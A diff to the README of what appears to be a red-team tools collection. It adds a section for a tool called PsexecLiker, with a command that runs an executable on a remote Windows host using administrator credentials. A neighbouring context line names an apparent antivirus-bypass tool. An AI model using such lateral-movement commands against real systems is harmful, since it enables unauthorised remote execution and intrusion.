@@ -168,3 +168,11 @@ bypass360
 ```
 
 ![](https://raw.githubusercontent.com/YangSirrr/YangsirRedTeamTools/main/00Tools%20Img%20From%20Readme/18-2.gif)
+
+## 19PsexecLiker
+
+```
+19.exe 192.168.159.143 administrator Aa123456 C:\Users\Administrator\Desktop\1.exe test
+```
+
+![](https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/psexec1.gif)
